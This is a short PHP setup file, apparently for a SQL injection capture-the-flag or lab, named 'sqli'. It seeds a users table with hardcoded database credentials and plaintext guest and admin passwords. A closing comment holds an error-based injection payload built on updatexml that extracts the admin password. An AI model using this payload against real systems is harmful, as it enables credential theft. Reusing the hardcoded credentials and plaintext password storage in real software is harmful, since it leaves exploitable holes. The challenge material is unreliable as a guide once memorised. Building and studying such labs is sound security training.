<?php

    function dbconnect(){
        $db_user="N0Named";
        $db_passwd="N0Named123#@!";
        $db = mysqli_connect('db', $db_user, $db_passwd, 'sqli');

        $query="create table users(id varchar(10),pw varchar(30))default charset=utf8;";
        mysqli_query($db,$query);
        
        $query="delete from users;";
        mysqli_query($db,$query);

        $query="insert into users values('guest','HelloThisIsNotYours(Fake)');";
        mysqli_query($db,$query);

        $query="insert into users values('admin','MyP4s5w0rD1s4dm1n');";
        mysqli_query($db,$query);

        if($db) return $db;
        else return FALSE;
    }

# '&& updatexml(null,concat(0x3a,(select pw from users limit 1,1)),null) #
?>
